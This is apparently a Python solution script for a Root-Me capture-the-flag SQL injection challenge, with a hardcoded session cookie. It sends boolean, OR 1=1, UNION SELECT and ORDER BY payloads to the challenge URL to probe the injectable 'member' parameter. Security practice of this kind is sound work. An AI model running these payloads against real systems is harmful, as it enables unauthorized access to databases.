import requests
import time

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

def test_boolean(payload):
    """Prueba Boolean-Based SQL Injection"""
    params = {"action": "member", "member": payload}
    try:
        r = requests.get(URL, params=params, cookies=COOKIE, timeout=5)
        # Buscar diferencias en la respuesta
        error = "Authentification error" in r.text
        member_list = "Member List" in r.text
        admin_present = "admin" in r.text
        return len(r.text), error, member_list, admin_present, r.text
    except Exception as e:
        print(f"Error: {e}")
        return 0, True, False, False, ""

print("="*70)
print("  PROBANDO BOOLEAN-BASED SQL INJECTION")
print("="*70)

# Baseline
print("\n[Baseline]")
l, e, ml, ap, content = test_boolean("1")
print(f"  Length: {l}, Error: {e}, Member List: {ml}, Admin: {ap}")
print(f"  Contenido: {content[:200]}...")

# Probar TRUE vs FALSE
print("\n[TRUE vs FALSE]")
payloads = [
    ("1 AND 1=1", "TRUE"),
    ("1 AND 1=2", "FALSE"),
    ("1' AND '1'='1", "TRUE (comillas)"),
    ("1' AND '1'='2", "FALSE (comillas)"),
    ("1) AND (1=1", "TRUE (paréntesis)"),
    ("1) AND (1=2", "FALSE (paréntesis)"),
]

for payload, desc in payloads:
    l, e, ml, ap, content = test_boolean(payload)
    print(f"{desc:20} -> Length: {l}, Error: {e}, Admin: {ap}")

# Probar OR (debería mostrar más usuarios)
print("\n[OR 1=1 - Debería mostrar más usuarios]")
payloads = [
    "1 OR 1=1",
    "1' OR '1'='1",
    "1) OR (1=1",
    "1' OR 1=1-- -",
    "1'/**/OR/**/1=1/**/-- -",
]

for payload in payloads:
    params = {"action": "member", "member": payload}
    r = requests.get(URL, params=params, cookies=COOKIE)
    l = len(r.text)
    content = r.text
    print(f"{payload[:25]:25} -> Length: {l}")
    
    # Buscar si aparecen más usuarios
    if "jsilver" in content and "jsparow" in content:
        print("  ✅ ¡OR 1=1 funciona! Muestra todos los usuarios")
        print(f"  Contenido: {content[:300]}...")
        break
    else:
        print("  ❌ No muestra más usuarios")

# Probar UNION SELECT para extraer datos
print("\n[UNION SELECT - Buscar número de columnas]")
for cols in range(1, 15):
    payload = f"1 UNION SELECT {','.join(['1']*cols)}"
    params = {"action": "member", "member": payload}
    r = requests.get(URL, params=params, cookies=COOKIE)
    l = len(r.text)
    content = r.text
    
    # Si la longitud cambia, puede ser vulnerable
    if l != 794:  # Baseline es 794
        print(f"[+] {cols} columnas: Length={l}")
        print(f"    Contenido: {content[:200]}...")
        break
    else:
        print(f"[-] {cols} columnas: Length={l}")
    time.sleep(0.3)

# Probar ORDER BY para encontrar columnas
print("\n[ORDER BY - Buscar límite de columnas]")
for i in range(1, 20):
    payload = f"1 ORDER BY {i}"
    params = {"action": "member", "member": payload}
    r = requests.get(URL, params=params, cookies=COOKIE)
    content = r.text
    
    # Si hay error o cambio en la respuesta
    if "error" in content.lower() or "sql" in content.lower():
        print(f"[+] Límite de columnas: {i-1}")
        print(f"    Error: {content[:200]}...")
        break
    else:
        print(f"[-] ORDER BY {i}: OK")
    time.sleep(0.3)
